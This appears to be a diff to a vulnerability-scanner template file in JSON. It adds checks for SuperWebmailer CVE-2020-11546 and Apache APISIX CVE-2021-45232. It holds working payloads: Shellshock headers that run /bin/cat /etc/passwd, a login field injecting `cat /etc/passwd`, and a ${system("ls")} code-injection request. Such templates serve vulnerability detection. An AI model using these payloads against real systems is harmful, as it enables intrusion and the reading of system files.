@@ -3214,9 +3214,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -8825,6 +8825,20 @@
       ]
     },
     {
+      "id": "CVE-2020-11546",
+      "info": {
+        "name": "SuperWebmailer Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /mailingupgrade.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nstep=1&Language=de{${system(\"ls\")}}&NextBtn=Weiter+%3E\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-11547",
       "info": {
         "name": "PRTG Network Monitor < 20.1.57.1745 - Information Disclosure",
@@ -9677,8 +9691,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -14398,6 +14412,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/lab.html?vpath=//example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-45232",
+      "info": {
+        "name": "Apache APISIX Dashboard api unauth access",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{RootURL}}/apisix/admin/migrate/export"
           ]
         }
       ]
